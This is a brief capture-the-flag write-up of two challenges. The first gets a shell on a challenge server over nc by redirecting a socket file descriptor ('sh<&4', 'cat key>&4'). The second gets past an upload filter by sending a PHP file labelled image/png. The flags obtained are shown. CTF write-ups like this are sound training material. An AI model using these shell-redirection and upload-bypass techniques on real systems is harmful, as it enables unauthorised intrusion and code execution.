## GiveMeShell

first of all, givemeshell is the "ELF 32-bit LSB executable". 
By trying a bit of reverse engineering, you get to know that the challenge executes the first 5 characters of the input in the remote shell.
since the program accesses the input with the fork, we can use the file descriptor 4 (which is socket) to spawn the shell and list the key.

```
C:\Users\Samsung>nc 119.70.231.180 8765
sh<&4
ls>&4
cat key>&4
key : WeLoveShell
```

## Secure Web

You can upload a image but the upload does not check file extension while it checks for the content type.
By uploading a file with php extension with the content-type: image/png, you will be able to list directory and get the flag.

the flag was in /home/dwh300/flags

```
 ad8888888888ba
dP'         `"8b,
8  ,aaa,       "Y888a     ,aaaa,     ,aaa,  ,aa,
8  8' `8           "8baaaad""""baaaad""""baad""8b
8  8   8              """"      """"      ""    8b
8  8, ,8         ,aaaaaaaaaaaaaaaaaaaaaaaaddddd88P
8  `"""'       ,d8""
Yb,         ,ad8"    Congratulations!!!!
 "Y8888888888P"         key is \"!!xx_^s0m3th1ng wr0ng^_yy!!\"
```